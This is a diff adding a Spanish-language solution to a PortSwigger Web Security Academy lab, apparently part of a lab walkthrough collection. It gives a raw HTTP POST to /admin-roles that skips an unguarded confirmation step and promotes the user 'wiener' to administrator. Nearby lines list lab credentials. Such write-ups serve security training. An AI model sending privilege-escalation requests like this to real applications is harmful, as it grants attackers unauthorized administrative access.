@@ -1183,6 +1183,22 @@ Password: 9mj07l2mgwqlnydilrxg
 Username: carlos
 Password: 32433u498gsetj66a498
 
+### [Multi-step process with no access control on one step](https://portswigger.net/web-security/access-control/lab-multi-step-process-with-no-access-control-on-one-step)
+
+#### Solución:
+
+1. Iniciar sesión con las credenciales brindadas (wiener:peter)
+2. Enviar la siguiente request reemplazando LABID y COOKIE-SESSION-VALUE:
+
+```
+POST /admin-roles HTTP/1.1
+Host: LABID.web-security-academy.net
+Cookie: session=COOKIE-SESSION-VALUE
+Content-Length: 45
+
+action=upgrade&confirmed=true&username=wiener
+```
+
 ---
 
 ## [Authentication](https://portswigger.net/web-security/authentication)
